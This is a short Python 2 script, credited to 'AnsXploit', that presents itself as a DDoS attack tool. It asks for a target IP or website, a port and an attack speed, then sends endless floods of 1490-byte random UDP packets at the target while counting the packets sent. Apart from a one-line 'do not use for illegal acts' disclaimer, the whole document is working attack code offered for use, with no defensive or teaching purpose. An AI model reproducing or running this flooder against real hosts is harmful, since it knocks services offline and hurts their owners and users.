# -*- coding: utf-8 -*-
# Python2 Script

import sys
import os
import time
import socket
import random
from datetime import datetime

# Warna ANSI
R = '\033[91m'  # Merah
G = '\033[92m'  # Hijau
Y = '\033[93m'  # Kuning
B = '\033[94m'  # Biru
P = '\033[95m'  # Ungu
C = '\033[96m'  # Cyan
W = '\033[0m'   # Reset warna

# Socket Setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Clear layar & Judul
os.system("clear")
os.system("figlet -f slant 'DDOS ATTACK' | lolcat")

# Informasi Author
print R + "/==================================================\\"
print G + "|               " + Y + "DDoS ATTACK SCRIPT - V1.0.0" + G + "              |"
print G + "|--------------------------------------------------|"
print G + "|  " + C + "Author         :" + W + " AnsXploit"
print G + "|  " + C + "Github         :" + W + " github.com/AnsXploit"
print G + "|  " + C + "Kata kata  :" + W + " KAMU NANYA 😅🙏 "
print G + "|  " + C + "Warning        :" + R + " Do not use for illegal acts!"
print R + "\\==================================================/" + W
print ""

# Tampilan Input IP dan Port
print C + "╔════════════════════════════════════════════════╗"
print C + "║              " + Y + "TARGET CONFIGURATION" + C + "              ║"
print C + "╚════════════════════════════════════════════════╝" + W

ip = raw_input(G + "┃ Input Target IP / Website: " + W)
port = int(input(G + "┃ Input Port (e.g. 80, 443): " + W))
sd = int(input(G + "┃ Attack Speed (1~1000)     : " + W))
print G + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛" + W
time.sleep(1)

# Clear lagi
os.system("clear")
os.system("figlet ATTACK STARTED | lolcat")

# Info Serangan
print C + "╔═══════════════════════════════════════╗"
print C + "║        " + R + "ATTACK LAUNCHED!" + C + " Be Careful!       ║"
print C + "╠═══════════════════════════════════════╣"
print C + "║ Target IP     : " + Y + "{}".format(ip) + C + " " * (22 - len(ip)) + "║"
print C + "║ Target Port   : " + Y + "{}".format(port) + C + " " * (22 - len(str(port))) + "║"
print C + "║ Attack Speed  : " + Y + "{}".format(sd) + C + " " * (22 - len(str(sd))) + "║"
print C + "╚═══════════════════════════════════════╝" + W
print G + "Press CTRL+C to stop the attack...\n" + W

# Mulai Kirim Paket
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    print B + "[+] Sent packet #{} to {} via port {}".format(sent, ip, port) + W
    time.sleep((1000 - sd) / 2000.0)